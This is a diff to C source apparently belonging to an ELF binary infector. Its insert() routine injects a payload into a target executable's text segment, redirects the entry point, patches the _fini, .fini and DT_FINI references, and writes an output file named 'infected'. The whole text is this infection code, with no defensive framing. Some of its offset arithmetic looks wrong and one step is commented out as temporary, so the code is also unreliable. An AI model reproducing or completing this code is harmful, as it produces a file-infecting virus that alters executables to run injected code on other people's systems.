@@ -9,6 +9,7 @@
 #include "insertion.h"
 
 #define JUMP_SIZE 5
+#define LIB_CSU_SIZE 5
 
 /*
  * Insert the _dest_ array into the ELF file
@@ -39,9 +40,11 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
     /* Now we update the entry point */
     set_entry_point(new_entry);
 
+    update_symbol("_fini", src_size);
+    update_section(".fini", src_size);
+    update_dynsym(DT_FINI, src_size);
     /* TMP */
-    add_offset(text->sh_offset, src_size);
-
+    //add_offset(text->sh_offset, src_size);
     /* Now we update the size of this segment/section */
     text->sh_size += src_size;
     seg->p_filesz += src_size;
@@ -62,9 +65,12 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
     for (; j < src_size; j++) {
 	final_product[i + j] = src[j];
     }
-    /* Finally we finish we the rest of the target content */
-    for (; i < dest_size; i++) {
+    for (; i < seg->p_offset + seg->p_filesz; i++) {
 	final_product[i + j] = dest[i];
+    }
+    /* Finally we finish we the rest of the target content */
+    for (i = (seg->p_offset & PAGE_SIZE) + PAGE_SIZE; i < dest_size; i++) {
+	final_product[i] = dest[i];
     }
     write_file("infected", final_product, dest_size + src_size);
 }
